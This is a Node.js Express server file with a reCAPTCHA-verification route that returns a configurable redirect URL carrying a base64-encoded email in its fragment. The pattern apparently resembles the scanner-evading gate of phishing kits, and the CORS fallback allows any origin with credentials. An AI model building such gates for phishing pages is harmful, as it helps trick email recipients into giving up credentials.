import express from 'express';
import axios from 'axios';
import cors from 'cors';
import rateLimit from 'express-rate-limit';
import morgan from 'morgan';
import { setDefaultResultOrder } from 'dns';

// =====================
// CRITICAL RAILWAY FIXES
// =====================
setDefaultResultOrder('ipv4first');

const app = express();
const PORT = process.env.PORT || 8080;

// =====================
// MIDDLEWARE
// =====================
app.set('trust proxy', 1);
app.use(cors({
  origin: process.env.FRONTEND_URL || '*',
  credentials: true
}));
app.use(express.json());
app.use(morgan('combined'));

app.use(rateLimit({
  windowMs: 60 * 1000,
  max: 100,
  standardHeaders: true,
  legacyHeaders: false
}));

// =====================
// ROUTES
// =====================
app.get('/health', (req, res) => {
  res.status(200).json({
    status: 'ready',
    timestamp: new Date().toISOString(),
    ipMode: 'ipv4-only'
  });
});

app.post('/verify-token', async (req, res) => {
  const { token, email } = req.body; // email is base64-encoded
  const secret = process.env.RECAPTCHA_SECRET;

  // Validate token format
  if (typeof token !== 'string' || token.length < 10) {
    return res.status(400).json({ success: false, error: 'Invalid token format' });
  }

  if (!secret) {
    return res.status(500).json({ success: false, error: 'Server configuration error' });
  }

  try {
    // Verify with Google
    const response = await axios.post(
      'https://www.google.com/recaptcha/api/siteverify',
      new URLSearchParams({ secret, response: token }),
      { 
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        timeout: 2500 
      }
    );

    const { success, score, 'error-codes': errors = [] } = response.data;

    // Strict score validation (NEW: 0.7 threshold)
    if (!success) {
      return res.status(403).json({
        success: false,
        reason: 'reCAPTCHA verification failed',
        errors
      });
    }

    if (score < 0.7) { // Reject scores below 0.7
      return res.status(403).json({
        success: false,
        reason: 'Low reCAPTCHA score (minimum: 0.7)',
        score,
        requiredScore: 0.7
      });
    }

    // Build redirect URL with base64 email (unchanged)
    let redirectUrl = process.env.REDIRECT_URL || 'https://default-redirect.com';
    if (email) {
      redirectUrl = `${redirectUrl.replace(/#.*$/, '')}#${email}`;
    }

    return res.json({ 
      success: true,
      redirect: redirectUrl,
      score // Optional: Return score to client
    });

  } catch (err) {
    console.error('reCAPTCHA API Error:', err.message);
    return res.status(502).json({ 
      success: false, 
      error: 'Verification service unavailable',
      retry: true 
    });
  }
});

// =====================
// SERVER START
// =====================
const server = app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server running on http://0.0.0.0:${PORT}`);
});

server.keepAliveTimeout = 60000;
server.headersTimeout = 65000;

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('🛑 Received shutdown signal');
  server.close(() => {
    console.log('✅ Server terminated cleanly');
    process.exit(0);
  });
});
